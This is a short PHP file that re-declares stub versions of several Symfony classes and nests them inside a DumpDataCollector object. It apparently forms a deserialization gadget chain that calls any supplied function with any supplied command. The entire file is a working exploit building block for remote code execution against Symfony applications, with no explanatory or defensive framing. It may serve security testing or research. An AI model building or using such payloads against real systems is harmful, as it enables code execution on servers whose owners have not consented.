<?php

namespace Symfony\Component\Cache\Adapter
{
    class ProxyAdapter
    {
        private $createCacheItem;
        private $namespace;
        private $pool;

        public function __construct($createCacheItem, $pool)
        {
            $this->createCacheItem = $createCacheItem;
            $this->pool = $pool;
            $this->namespace = '';
        }
    }


    class NullAdapter
    {
        private $createCacheItem;

        public function __construct($createCacheItem)
        {
            $this->createCacheItem = $createCacheItem;
        }
    }
}

namespace Symfony\Component\Console\Helper
{
    class Dumper
    {
        private $handler;

        public function __construct($handler)
        {
            $this->handler = $handler;
        }
    }
}


namespace Symfony\Component\Cache\Traits
{
    class RedisProxy
    {
        private $redis;
        private $initializer;

        public function __construct($initializer, $redis)
        {
            $this->initializer = $initializer;
            $this->redis = $redis;
        }
    }
}

namespace Symfony\Component\Form
{

    class FormErrorIterator
    {
        public $form;
        private $errors;

        function __construct($errors, $form)
        {
            $this->errors = $errors;
            $this->form = $form;
        }
    }
}


namespace Symfony\Component\HttpKernel\DataCollector
{
    class DumpDataCollector
    {
        protected $data;
        private $stopwatch;
        private $fileLinkFormat;
        private $dataCount = 0;
        private $isCollected = false;
        private $clonesCount = 0;
        private $clonesIndex = 0;

        public function __construct($function, $command)
        {
            $this->data = [
                [
                    "data" => "1",
                    "name" => new \Symfony\Component\Form\FormErrorIterator([
                        new \Symfony\Component\Form\FormErrorIterator(
                            [], 
                            new \Symfony\Component\Cache\Traits\RedisProxy(
                                new \Symfony\Component\Console\Helper\Dumper([
                                    new \Symfony\Component\Cache\Adapter\ProxyAdapter(
                                        'dd', // exit function
                                        new \Symfony\Component\Cache\Adapter\NullAdapter($function)
                                    ),
                                    "getItem"
                                ]),
                                $command
                            )
                        )],
                        null
                    ),
                    "file" => "3",
                    "line" => "4"
                ],
                null,
                null
            ];
        }
    }
}
